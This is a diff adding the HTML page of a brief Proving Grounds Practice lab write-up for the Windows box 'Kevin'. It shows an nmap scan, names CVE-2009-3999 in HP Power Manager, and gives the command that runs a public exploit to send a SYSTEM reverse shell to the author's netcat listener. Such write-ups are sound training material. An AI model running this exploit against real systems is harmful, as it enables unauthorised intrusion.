@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>PG Practice - Kevin | Fabio Birnegger</title>
+<meta name="keywords" content="Proving Grounds Practice, Linux, Write-Up">
+<meta name="description" content="Box Details
+
+  
+      
+          
+          
+      
+  
+  
+      
+          Difficulty
+          Easy
+      
+      
+          Type
+          Windows
+      
+  
+
+Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.45
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          GoAhead WebServer
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.237.45/index.asp
+|_http-server-header: GoAhead-Webs
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2026-06-22T18:36:27
+|_Not valid after:  2026-12-22T18:36:27
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2026-06-23T18:41:26&#43;00:00
+|_ssl-date: 2026-06-23T18:41:34&#43;00:00; &#43;2s from scanner time.
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+Proof
+On the webserver on port 80 a HP Power Manager instance is running. The used version 4.0.2 is vulnerable to CVE-2009-3999 for which i found this public exploit. I ran the exploit as follows after starting a netcat listener on port 4444:">
+<meta name="author" content="Fabio Birnegger">
+<link rel="canonical" href="http://localhost:1313/writeups/pg_kevin/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/pg_kevin/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/pg_kevin/">
+  <meta property="og:site_name" content="Fabio Birnegger">
+  <meta property="og:title" content="PG Practice - Kevin">
+  <meta property="og:description" content="Box Details
+Difficulty Easy Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.45PORT STATE SERVICE VERSION80/tcp open http GoAhead WebServer| http-title: HP Power Manager|_Requested resource was http://192.168.237.45/index.asp|_http-server-header: GoAhead-Webs135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ms-wbt-server Microsoft Terminal Service| ssl-cert: Subject: commonName=kevin| Not valid before: 2026-06-22T18:36:27|_Not valid after: 2026-12-22T18:36:27| rdp-ntlm-info: | Target_Name: KEVIN| NetBIOS_Domain_Name: KEVIN| NetBIOS_Computer_Name: KEVIN| DNS_Domain_Name: kevin| DNS_Computer_Name: kevin| Product_Version: 6.1.7600|_ System_Time: 2026-06-23T18:41:26&#43;00:00|_ssl-date: 2026-06-23T18:41:34&#43;00:00; &#43;2s from scanner time.3573/tcp open tag-ups-1?49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPC49160/tcp open msrpc Microsoft Windows RPCService Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows Proof On the webserver on port 80 a HP Power Manager instance is running. The used version 4.0.2 is vulnerable to CVE-2009-3999 for which i found this public exploit. I ran the exploit as follows after starting a netcat listener on port 4444:">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-22T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-22T00:00:00+00:00">
+    <meta property="article:tag" content="Proving Grounds Practice">
+    <meta property="article:tag" content="Linux">
+    <meta property="article:tag" content="Write-Up">
+    <meta property="og:image" content="http://localhost:1313/writeups/pg_kevin/images/writeup_screens/pg_kevin/pg_kevin_cover.svg">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/writeups/pg_kevin/images/writeup_screens/pg_kevin/pg_kevin_cover.svg">
+  <meta name="twitter:title" content="PG Practice - Kevin">
+  <meta name="twitter:description" content="Box Details
+Difficulty Easy Type Windows Port Scan
+└─$ nmap -sV -sC -p- 192.168.237.45PORT STATE SERVICE VERSION80/tcp open http GoAhead WebServer| http-title: HP Power Manager|_Requested resource was http://192.168.237.45/index.asp|_http-server-header: GoAhead-Webs135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)3389/tcp open ms-wbt-server Microsoft Terminal Service| ssl-cert: Subject: commonName=kevin| Not valid before: 2026-06-22T18:36:27|_Not valid after: 2026-12-22T18:36:27| rdp-ntlm-info: | Target_Name: KEVIN| NetBIOS_Domain_Name: KEVIN| NetBIOS_Computer_Name: KEVIN| DNS_Domain_Name: kevin| DNS_Computer_Name: kevin| Product_Version: 6.1.7600|_ System_Time: 2026-06-23T18:41:26&#43;00:00|_ssl-date: 2026-06-23T18:41:34&#43;00:00; &#43;2s from scanner time.3573/tcp open tag-ups-1?49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49158/tcp open msrpc Microsoft Windows RPC49160/tcp open msrpc Microsoft Windows RPCService Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows Proof On the webserver on port 80 a HP Power Manager instance is running. The used version 4.0.2 is vulnerable to CVE-2009-3999 for which i found this public exploit. I ran the exploit as follows after starting a netcat listener on port 4444:">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "PG Practice - Kevin",
+      "item": "http://localhost:1313/writeups/pg_kevin/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "PG Practice - Kevin",
+  "name": "PG Practice - Kevin",
+  "description": "Box Details\nDifficulty Easy Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.237.45\rPORT STATE SERVICE VERSION\r80/tcp open http GoAhead WebServer\r| http-title: HP Power Manager\r|_Requested resource was http://192.168.237.45/index.asp\r|_http-server-header: GoAhead-Webs\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)\r3389/tcp open ms-wbt-server Microsoft Terminal Service\r| ssl-cert: Subject: commonName=kevin\r| Not valid before: 2026-06-22T18:36:27\r|_Not valid after: 2026-12-22T18:36:27\r| rdp-ntlm-info: | Target_Name: KEVIN\r| NetBIOS_Domain_Name: KEVIN\r| NetBIOS_Computer_Name: KEVIN\r| DNS_Domain_Name: kevin\r| DNS_Computer_Name: kevin\r| Product_Version: 6.1.7600\r|_ System_Time: 2026-06-23T18:41:26+00:00\r|_ssl-date: 2026-06-23T18:41:34+00:00; +2s from scanner time.\r3573/tcp open tag-ups-1?\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49158/tcp open msrpc Microsoft Windows RPC\r49160/tcp open msrpc Microsoft Windows RPC\rService Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows Proof On the webserver on port 80 a HP Power Manager instance is running. The used version 4.0.2 is vulnerable to CVE-2009-3999 for which i found this public exploit. I ran the exploit as follows after starting a netcat listener on port 4444:\n",
+  "keywords": [
+    "Proving Grounds Practice", "Linux", "Write-Up"
+  ],
+  "articleBody": "Box Details\nDifficulty Easy Type Windows Port Scan\n└─$ nmap -sV -sC -p- 192.168.237.45\rPORT STATE SERVICE VERSION\r80/tcp open http GoAhead WebServer\r| http-title: HP Power Manager\r|_Requested resource was http://192.168.237.45/index.asp\r|_http-server-header: GoAhead-Webs\r135/tcp open msrpc Microsoft Windows RPC\r139/tcp open netbios-ssn Microsoft Windows netbios-ssn\r445/tcp open microsoft-ds Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)\r3389/tcp open ms-wbt-server Microsoft Terminal Service\r| ssl-cert: Subject: commonName=kevin\r| Not valid before: 2026-06-22T18:36:27\r|_Not valid after: 2026-12-22T18:36:27\r| rdp-ntlm-info: | Target_Name: KEVIN\r| NetBIOS_Domain_Name: KEVIN\r| NetBIOS_Computer_Name: KEVIN\r| DNS_Domain_Name: kevin\r| DNS_Computer_Name: kevin\r| Product_Version: 6.1.7600\r|_ System_Time: 2026-06-23T18:41:26+00:00\r|_ssl-date: 2026-06-23T18:41:34+00:00; +2s from scanner time.\r3573/tcp open tag-ups-1?\r49152/tcp open msrpc Microsoft Windows RPC\r49153/tcp open msrpc Microsoft Windows RPC\r49154/tcp open msrpc Microsoft Windows RPC\r49155/tcp open msrpc Microsoft Windows RPC\r49158/tcp open msrpc Microsoft Windows RPC\r49160/tcp open msrpc Microsoft Windows RPC\rService Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows Proof On the webserver on port 80 a HP Power Manager instance is running. The used version 4.0.2 is vulnerable to CVE-2009-3999 for which i found this public exploit. I ran the exploit as follows after starting a netcat listener on port 4444:\n└─$ python3 CVE-2009-3999.py $IP 80 192.168.45.212 4444 Shortly after, I received a SYSTEM reverse shell and was able to read C:\\Users\\Administrator\\Desktop\\proof.txt.\n",
+  "wordCount" : "216",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/writeups/pg_kevin/images/writeup_screens/pg_kevin/pg_kevin_cover.svg","datePublished": "2026-06-22T00:00:00Z",
+  "dateModified": "2026-06-22T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Fabio Birnegger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/pg_kevin/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Fabio Birnegger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Fabio Birnegger (Alt + H)">Fabio Birnegger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/writeups/" title="Write-ups">
+                    <span>Write-ups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/publications/" title="Publications &amp; Talks">
+                    <span>Publications &amp; Talks</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="whoami">
+                    <span>whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      PG Practice - Kevin
+    </h1>
+    <div class="post-meta">
+
+<span title='2026-06-22 00:00:00 +0000 UTC'>June 22, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>Fabio Birnegger</span>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+        <img loading="eager" src="http://localhost:1313/images/writeup_screens/pg_kevin/pg_kevin_cover.svg" alt="Cover">
+        
+</figure>
+  <div class="post-content md-content"><p><strong>Box Details</strong></p>
+<table>
+  <thead>
+      <tr>
+          <th></th>
+          <th></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Easy</td>
+      </tr>
+      <tr>
+          <td>Type</td>
+          <td>Windows</td>
+      </tr>
+  </tbody>
+</table>
+<p><strong>Port Scan</strong></p>
+<pre tabindex="0"><code>└─$ nmap -sV -sC -p- 192.168.237.45
+PORT      STATE SERVICE       VERSION
+80/tcp    open  http          GoAhead WebServer
+| http-title: HP Power Manager
+|_Requested resource was http://192.168.237.45/index.asp
+|_http-server-header: GoAhead-Webs
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows 7 Ultimate N 7600 microsoft-ds (workgroup: WORKGROUP)
+3389/tcp  open  ms-wbt-server Microsoft Terminal Service
+| ssl-cert: Subject: commonName=kevin
+| Not valid before: 2026-06-22T18:36:27
+|_Not valid after:  2026-12-22T18:36:27
+| rdp-ntlm-info: 
+|   Target_Name: KEVIN
+|   NetBIOS_Domain_Name: KEVIN
+|   NetBIOS_Computer_Name: KEVIN
+|   DNS_Domain_Name: kevin
+|   DNS_Computer_Name: kevin
+|   Product_Version: 6.1.7600
+|_  System_Time: 2026-06-23T18:41:26+00:00
+|_ssl-date: 2026-06-23T18:41:34+00:00; +2s from scanner time.
+3573/tcp  open  tag-ups-1?
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49158/tcp open  msrpc         Microsoft Windows RPC
+49160/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: KEVIN; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre><h2 id="proof">Proof<a hidden class="anchor" aria-hidden="true" href="#proof">#</a></h2>
+<p>On the webserver on port <strong>80</strong> a <strong>HP Power Manager</strong> instance is running. The used version <strong>4.0.2</strong> is vulnerable to <strong>CVE-2009-3999</strong> for which i found this <a href="https://github.com/AC8999/CVE-2009-3999-HP-Power-Manager-4.2-Build-7-Buffer-Overflow/blob/main/CVE-2009-3999.py">public exploit</a>. I ran the exploit as follows after starting a netcat listener on port <strong>4444</strong>:</p>
+<pre tabindex="0"><code>└─$ python3 CVE-2009-3999.py $IP 80 192.168.45.212 4444
+</code></pre><p>Shortly after, I received a <em>SYSTEM</em> reverse shell and was able to read <em>C:\Users\Administrator\Desktop\proof.txt</em>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/proving-grounds-practice/">Proving Grounds Practice</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/write-up/">Write-Up</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/writeups/pg_internal/">
+    <span class="title">« Prev</span>
+    <span>PG Practice - Internal</span>
+  </a>
+  <a class="next" href="http://localhost:1313/writeups/pg_nibbles/">
+    <span class="title">Next »</span>
+    <span>PG Practice - Nibbles</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Fabio Birnegger</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
